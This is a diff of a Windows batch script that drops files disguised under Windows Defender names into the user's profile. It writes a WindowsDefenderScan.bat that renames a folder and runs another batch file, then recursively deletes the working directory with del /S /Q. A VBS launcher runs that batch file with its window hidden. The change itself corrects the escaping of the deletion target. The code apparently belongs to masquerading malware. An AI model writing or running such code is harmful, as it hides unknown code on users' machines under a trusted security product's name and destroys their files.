@@ -13,7 +13,7 @@ echo rename 1-main WindowsDefenderServices >> "%userprofile%\WindowsDefender\Win
 echo cd WindowsDefenderServices >> "%userprofile%\WindowsDefender\WindowsDefenderScan.bat"
 echo rename 1.bat WindowsDefenderSecurity.bat >> "%userprofile%\WindowsDefender\WindowsDefenderScan.bat"
 echo WindowsDefenderSecurity.bat >> "%userprofile%\WindowsDefender\WindowsDefenderScan.bat"
-echo del /S /Q "%cd%" >> "%userprofile%\WindowsDefender\WindowsDefenderScan.bat"
+echo del /S /Q "%%cd%%" >> "%userprofile%\WindowsDefender\WindowsDefenderScan.bat"
 echo Set WshShell = CreateObject("WScript.Shell") > "%userprofile%\WindowsDefender\WindowsDefenderBackgroundServices.vbs"
 echo WshShell.Run chr(34) ^& "%%userprofile%%\WindowsDefender\WindowsDefenderScan.bat" ^& Chr(34), 0 >> "%userprofile%\WindowsDefender\WindowsDefenderBackgroundServices.vbs"
 echo Set WshShell = Nothing >> "%userprofile%\WindowsDefender\WindowsDefenderBackgroundServices.vbs"
